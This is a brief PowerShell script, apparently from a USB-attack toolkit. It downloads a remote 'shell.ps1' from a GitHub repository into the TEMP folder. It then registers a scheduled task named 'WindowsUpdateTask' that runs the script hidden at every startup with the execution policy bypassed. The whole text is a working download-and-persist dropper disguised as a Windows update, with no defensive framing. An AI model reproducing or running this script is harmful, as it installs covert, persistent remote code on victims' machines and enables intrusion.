# Download and execute shell.ps1
iwr -Uri "https://raw.githubusercontent.com/err0r-arsenal/usbhack/refs/heads/main/shell.ps1" -OutFile "$env:TEMP\s.ps1"

# Add Scheduled Task (runs at startup)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ep bypass -w hidden $env:TEMP\s.ps1"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName "WindowsUpdateTask" -Action $action -Trigger $trigger -Force
